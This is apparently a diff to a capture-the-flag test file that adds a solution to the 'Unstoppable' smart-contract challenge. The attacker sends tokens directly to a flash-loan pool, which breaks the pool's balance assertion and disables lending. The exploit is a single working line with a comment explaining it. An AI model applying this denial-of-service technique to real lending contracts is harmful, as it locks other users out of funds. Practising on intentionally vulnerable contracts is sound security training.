@@ -40,6 +40,8 @@ describe('[Challenge] Unstoppable', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        // Below breaks `assert(poolBalance == balanceBefore);` in UnstoppableLender.flashLoan function
+        await this.token.connect(attacker).transfer(this.pool.address, 10);
     });
 
     after(async function () {
